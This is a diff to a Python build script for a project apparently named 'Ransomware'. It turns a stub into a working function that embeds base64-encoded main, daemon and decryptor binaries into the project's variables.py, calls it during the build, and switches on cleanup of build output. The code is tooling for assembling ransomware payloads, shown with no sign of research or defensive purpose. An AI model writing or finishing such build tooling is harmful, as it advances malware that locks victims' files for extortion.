@@ -71,22 +71,45 @@ def build_daemon():
     return build('daemon')
 
 
-def change_Z434M4_binaries():
-    # This function should update the variables.py file
-    # with the base64-encoded binaries
-    print("Updating variables.py with new binaries...")
+def update_variables_file():
+    """Update variables.py with base64 encoded executables"""
+    print("Updating variables.py with base64 encoded executables...")
     variables_path = os.path.join(os.getcwd(), "Ransomware", "variables.py")
     
     if not os.path.exists(variables_path):
         error("variables.py not found")
     
-    # Read current variables file
-    with open(variables_path, 'r') as f:
-        variables_content = f.read()
+    # Read the base64 encoded files
+    try:
+        with open("base64main", "rb") as f:
+            main_base64 = f.read().decode('utf-8')
+        
+        with open("base64daemon", "rb") as f:
+            daemon_base64 = f.read().decode('utf-8')
+            
+        with open("base64decryptor", "rb") as f:
+            decryptor_base64 = f.read().decode('utf-8')
+    except Exception as e:
+        error(f"Could not read base64 files: {str(e)}")
     
-    # Update with new binaries (if this function gets implemented)
-    # For now, just printing a warning
-    print("Warning: change_Z434M4_binaries() is not fully implemented")
+    # Read the variables file
+    with open(variables_path, "r") as f:
+        content = f.readlines()
+    
+    # Update the variables
+    for i, line in enumerate(content):
+        if line.startswith("Z434M4 ="):
+            content[i] = f'Z434M4 = b"""{main_base64}"""\n'
+        elif line.startswith("decryptor ="):
+            content[i] = f'decryptor = b"""{decryptor_base64}"""\n'
+        elif line.startswith("daemon ="):
+            content[i] = f'daemon = b"""{daemon_base64}"""\n'
+    
+    # Write back to the file
+    with open(variables_path, "w") as f:
+        f.writelines(content)
+    
+    print("Successfully updated variables.py")
 
 
 def clean_dist():
@@ -118,6 +141,9 @@ def main():
     daemon64 = build_daemon()
     Z434M4_64 = build_Z434M4()
     
+    # Update variables.py with the base64 encoded executables
+    update_variables_file()
+    
     print("\nBuild process complete!")
     print("--------------------------------------")
     print("The following files were created:")
@@ -128,9 +154,10 @@ def main():
     print("- base64daemon - Base64 encoded daemon binary")
     print("- base64decryptor - Base64 encoded decryptor binary")
     print("--------------------------------------")
+    print("variables.py has been updated with base64 encoded binaries")
 
 
 if __name__ == '__main__':
     main()
     # Uncomment to clean up after building:
-    # clean_dist()
+    clean_dist()
